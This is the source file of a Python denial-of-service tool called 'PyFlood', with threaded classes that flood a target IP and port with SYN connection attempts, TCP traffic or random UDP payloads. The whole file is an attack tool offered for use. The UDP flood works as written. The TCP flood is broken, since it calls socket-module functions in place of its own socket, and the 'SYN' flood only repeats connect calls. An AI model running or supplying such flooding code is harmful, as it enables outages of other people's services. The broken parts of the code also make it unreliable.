# PyFlood DoS Flooder
# Version 1.0.0
# Coded by BlackMan in Python 3.3.2
# Download : N/A
# File     : pyflood.py

#IMPORTS
import random
import socket
import sys
import threading

#SYN FLOOD
class synFlood(threading.Thread):
    def __init__(self, ip, port, packets):
        self.ip      = ip
        self.port    = port
        self.packets = packets
        self.syn     = socket.socket()
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                self.syn.connect((self.ip, self.port))
            except:
                pass

#TCP FLOOD
class tcpFlood(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip      = ip
        self.port    = port
        self.size    = size
        self.packets = packets
        self.tcp     = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                socket.connect(self.ip, self.port)
                socket.setblocking(0)
                socket.sendto(bytes,(self.ip, self.port))
            except:
                pass

#UDP FLOOD
class udpFlood(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip      = ip
        self.port    = port
        self.size    = size
        self.packets = packets
        self.udp     = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.udp.sendto(bytes,(self.ip, self.port))
            except:
                pass